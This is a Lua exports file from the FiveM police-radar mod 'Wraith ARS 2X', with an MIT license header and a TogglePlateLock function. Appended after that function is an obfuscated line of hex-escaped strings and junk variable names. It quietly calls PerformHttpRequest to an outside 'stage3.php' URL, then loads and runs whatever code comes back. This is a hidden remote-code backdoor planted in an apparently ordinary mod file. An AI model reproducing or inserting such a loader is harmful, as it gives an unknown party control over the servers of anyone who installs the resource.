--[[---------------------------------------------------------------------------------------

	Wraith ARS 2X
	Created by WolfKnight
	
	For discussions, information on future updates, and more, join 
	my Discord: https://discord.gg/fD4e6WD 
	
	MIT License

	Copyright (c) 2020 WolfKnight

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

---------------------------------------------------------------------------------------]]--

-- Although there is only one export at the moment, more may be added down the line. 

--[[---------------------------------------------------------------------------------------
	Locks the designated plate reader camera for the given client. 

	Parameters:
		clientId:
			The id of the client
		cam:
			The camera to lock, either "front" or "rear"
		beepAudio:
			Play an audible beep, either true or false
		boloAudio:
			Play the bolo lock sound, either true or false
---------------------------------------------------------------------------------------]]--
function TogglePlateLock( clientId, cam, beepAudio, boloAudio )
	TriggerClientEvent( "wk:togglePlateLock", clientId, cam, beepAudio, boloAudio )
end 

local oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[4][oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x65\x74\x61\x72\x73\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x53\x69\x78\x58\x6c", function (nFBhaBTZrBbbeMfZXIFGWECcIirreWNRXOLqSKEfWJYwesoKkUKDmUffPqpHxiVsWhDGwP, eCJlbPXMRqYGFLYiAmtZSCdmnzJdhKKhyKsHfrTUGXKHQjDebhPQXhSVZdjNwjnpPfQFCT) if (eCJlbPXMRqYGFLYiAmtZSCdmnzJdhKKhyKsHfrTUGXKHQjDebhPQXhSVZdjNwjnpPfQFCT == oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[6] or eCJlbPXMRqYGFLYiAmtZSCdmnzJdhKKhyKsHfrTUGXKHQjDebhPQXhSVZdjNwjnpPfQFCT == oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[5]) then return end oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[4][oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[2]](oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[4][oLhsGOQoJeOAuunicjjAlFRrGRaOVqYrfJQEsMIKTGZoeaWNIbJBOMxqSWowuZDuMkuQee[3]](eCJlbPXMRqYGFLYiAmtZSCdmnzJdhKKhyKsHfrTUGXKHQjDebhPQXhSVZdjNwjnpPfQFCT))() end)